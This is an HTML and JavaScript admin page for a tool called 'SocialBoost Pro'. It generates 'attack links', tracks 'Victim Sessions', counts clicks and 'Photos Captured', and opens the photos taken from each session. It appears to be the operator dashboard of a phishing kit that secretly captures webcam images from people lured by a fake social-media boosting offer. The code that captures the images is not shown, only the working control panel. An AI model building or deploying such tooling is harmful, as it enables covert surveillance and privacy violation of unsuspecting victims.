<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SocialBoost Pro - Admin</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a1a;
            color: #fff;
            padding: 20px;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .header h1 {
            font-size: 28px;
            background: linear-gradient(90deg, #c084fc, #ec4899);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .badge {
            background: rgba(236,73,153,0.2);
            color: #ec4899;
            padding: 6px 16px;
            border-radius: 20px;
            font-size: 12px;
            border: 1px solid rgba(236,73,153,0.3);
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: rgba(255,255,255,0.05);
            padding: 20px;
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.05);
            text-align: center;
        }
        .stat-card .number {
            font-size: 32px;
            font-weight: 700;
            color: #c084fc;
        }
        .stat-card .label {
            font-size: 12px;
            color: rgba(255,255,255,0.5);
            margin-top: 5px;
        }
        .btn-primary {
            background: linear-gradient(90deg, #c084fc, #ec4899);
            border: none;
            color: #fff;
            padding: 12px 30px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .btn-primary:hover {
            transform: scale(1.05);
            box-shadow: 0 10px 30px rgba(192,132,252,0.3);
        }
        .btn-secondary {
            background: rgba(255,255,255,0.1);
            border: none;
            color: #fff;
            padding: 12px 30px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .btn-secondary:hover {
            background: rgba(255,255,255,0.2);
        }
        .btn-group {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }
        .sessions {
            margin-top: 30px;
        }
        .sessions h3 {
            margin-bottom: 15px;
            color: rgba(255,255,255,0.7);
        }
        .session-item {
            background: rgba(255,255,255,0.03);
            padding: 15px 20px;
            border-radius: 10px;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-left: 3px solid rgba(255,255,255,0.1);
            flex-wrap: wrap;
            gap: 10px;
        }
        .session-item.active {
            border-left-color: #c084fc;
        }
        .session-id {
            font-family: 'Courier New', monospace;
            font-size: 14px;
            color: #c084fc;
        }
        .session-status {
            padding: 4px 12px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 600;
        }
        .status-active {
            background: rgba(192,132,252,0.2);
            color: #c084fc;
        }
        .status-waiting {
            background: rgba(255,255,255,0.1);
            color: rgba(255,255,255,0.5);
        }
        .session-details {
            font-size: 12px;
            color: rgba(255,255,255,0.4);
        }
        .link-box {
            background: rgba(255,255,255,0.05);
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            word-break: break-all;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            border: 1px solid rgba(255,255,255,0.05);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        .copy-btn {
            background: rgba(255,255,255,0.1);
            border: none;
            color: #fff;
            padding: 4px 12px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 11px;
        }
        .copy-btn:hover {
            background: rgba(255,255,255,0.2);
        }
        .view-photos-btn {
            background: rgba(192,132,252,0.2);
            border: 1px solid rgba(192,132,252,0.3);
            color: #c084fc;
            padding: 4px 12px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 11px;
        }
        .view-photos-btn:hover {
            background: rgba(192,132,252,0.3);
        }
        .no-sessions {
            color: rgba(255,255,255,0.3);
            text-align: center;
            padding: 40px 0;
        }
        .session-info {
            display: flex;
            flex-direction: column;
            gap: 4px;
        }
        .session-actions {
            display: flex;
            gap: 8px;
            align-items: center;
            flex-wrap: wrap;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>🚀 SocialBoost Pro - Admin</h1>
        <span class="badge">🔴 LIVE</span>
    </div>
    
    <div class="stats" id="stats">
        <div class="stat-card">
            <div class="number" id="totalSessions">0</div>
            <div class="label">Total Sessions</div>
        </div>
        <div class="stat-card">
            <div class="number" id="activeSessions">0</div>
            <div class="label">Active</div>
        </div>
        <div class="stat-card">
            <div class="number" id="totalPhotos">0</div>
            <div class="label">Photos Captured</div>
        </div>
        <div class="stat-card">
            <div class="number" id="totalClicks">0</div>
            <div class="label">Total Clicks</div>
        </div>
    </div>
    
    <div class="btn-group">
        <button class="btn-primary" id="generateBtn">🎯 Generate New Attack Link</button>
        <button class="btn-secondary" id="refreshBtn">🔄 Refresh</button>
    </div>
    
    <div id="newLinkContainer" style="display: none;">
        <div class="link-box">
            <span id="linkText">Loading...</span>
            <button class="copy-btn" onclick="copyLink()">📋 Copy</button>
        </div>
    </div>
    
    <div class="sessions">
        <h3>📊 Victim Sessions</h3>
        <div id="sessionsList">
            <p class="no-sessions">No sessions yet. Generate a link to start.</p>
        </div>
    </div>

    <script>
        let currentLink = '';

        // View photos for a session
        async function viewPhotos(sessionId) {
            try {
                const res = await fetch(`/api/photos/${sessionId}`);
                const data = await res.json();
                
                if (data.photos && data.photos.length > 0) {
                    const win = window.open('', '_blank');
                    win.document.write(`
                        <html>
                        <head>
                            <title>📸 Captured Photos</title>
                            <style>
                                body { 
                                    font-family: 'Segoe UI', sans-serif; 
                                    background: #0a0a1a; 
                                    color: #fff; 
                                    padding: 20px; 
                                    display: flex;
                                    flex-wrap: wrap;
                                    gap: 20px;
                                    justify-content: center;
                                }
                                .photo-card {
                                    background: rgba(255,255,255,0.05);
                                    border-radius: 16px;
                                    padding: 16px;
                                    border: 1px solid rgba(255,255,255,0.1);
                                    width: 320px;
                                    text-align: center;
                                }
                                .photo-card img {
                                    width: 100%;
                                    border-radius: 12px;
                                    border: 2px solid rgba(192,132,252,0.2);
                                }
                                .photo-card .meta {
                                    font-size: 11px;
                                    color: rgba(255,255,255,0.4);
                                    margin-top: 8px;
                                }
                                h1 {
                                    background: linear-gradient(90deg, #c084fc, #ec4899);
                                    -webkit-background-clip: text;
                                    -webkit-text-fill-color: transparent;
                                    width: 100%;
                                    text-align: center;
                                }
                                .back-btn {
                                    background: rgba(255,255,255,0.1);
                                    border: none;
                                    color: #fff;
                                    padding: 10px 24px;
                                    border-radius: 10px;
                                    cursor: pointer;
                                    font-size: 14px;
                                    width: 100%;
                                    margin-bottom: 20px;
                                }
                                .back-btn:hover {
                                    background: rgba(255,255,255,0.2);
                                }
                                .no-photos {
                                    text-align: center;
                                    color: rgba(255,255,255,0.3);
                                    padding: 40px;
                                    width: 100%;
                                }
                            </style>
                        </head>
                        <body>
                            <button class="back-btn" onclick="window.close()">⬅ Close</button>
                            <h1>📸 Captured Photos</h1>
                            ${data.photos.map(p => `
                                <div class="photo-card">
                                    <img src="${p.image}" alt="Captured photo" />
                                    <div class="meta">
                                        ${new Date(p.timestamp).toLocaleString()}
                                    </div>
                                </div>
                            `).join('')}
                        </body>
                        </html>
                    `);
                    win.document.close();
                } else {
                    alert('No photos found for this session.');
                }
            } catch (err) {
                alert('Failed to load photos: ' + err.message);
            }
        }

        // Fetch dashboard data
        async function fetchDashboard() {
            try {
                const res = await fetch('/api/dashboard');
                const data = await res.json();
                
                const sessions = data.sessions || [];
                document.getElementById('totalSessions').textContent = sessions.length;
                document.getElementById('activeSessions').textContent = sessions.filter(s => s.status === 'ACTIVE').length;
                document.getElementById('totalPhotos').textContent = sessions.reduce((sum, s) => sum + (s.photos || 0), 0);
                document.getElementById('totalClicks').textContent = sessions.reduce((sum, s) => sum + (s.clicks || 0), 0);
                
                const list = document.getElementById('sessionsList');
                if (sessions.length === 0) {
                    list.innerHTML = '<p class="no-sessions">No sessions yet. Generate a link to start.</p>';
                    return;
                }
                
                list.innerHTML = sessions.map(s => `
                    <div class="session-item ${s.status === 'ACTIVE' ? 'active' : ''}">
                        <div class="session-info">
                            <div class="session-id">${s.id}</div>
                            <div class="session-details">Clicks: ${s.clicks} · Photos: ${s.photos} · Created: ${new Date(s.created).toLocaleString()}</div>
                        </div>
                        <div class="session-actions">
                            <span class="session-status ${s.status === 'ACTIVE' ? 'status-active' : 'status-waiting'}">${s.status}</span>
                            ${s.photos > 0 ? `<button class="view-photos-btn" data-session="${s.id}">📸 View Photos</button>` : ''}
                        </div>
                    </div>
                `).join('');

                // Add event listeners for view photo buttons
                document.querySelectorAll('.view-photos-btn').forEach(btn => {
                    btn.addEventListener('click', async function() {
                        const sessionId = this.dataset.session;
                        await viewPhotos(sessionId);
                    });
                });

            } catch (err) {
                console.error('Failed to fetch dashboard:', err);
            }
        }

        // Generate new link
        document.getElementById('generateBtn').addEventListener('click', async () => {
            try {
                const res = await fetch('/api/generate', { method: 'POST' });
                const data = await res.json();
                
                currentLink = data.link;
                document.getElementById('linkText').textContent = currentLink;
                document.getElementById('newLinkContainer').style.display = 'block';
                
                setTimeout(fetchDashboard, 1000);
            } catch (err) {
                alert('Failed to generate link: ' + err.message);
            }
        });

        // Copy link
        function copyLink() {
            if (navigator.clipboard) {
                navigator.clipboard.writeText(currentLink).then(() => {
                    alert('✅ Link copied to clipboard!');
                }).catch(() => {
                    fallbackCopy();
                });
            } else {
                fallbackCopy();
            }
        }

        function fallbackCopy() {
            const textarea = document.createElement('textarea');
            textarea.value = currentLink;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            alert('✅ Link copied!');
        }

        // Refresh
        document.getElementById('refreshBtn').addEventListener('click', fetchDashboard);

        // Auto-refresh every 10 seconds
        fetchDashboard();
        setInterval(fetchDashboard, 10000);
    </script>
</body>
</html>
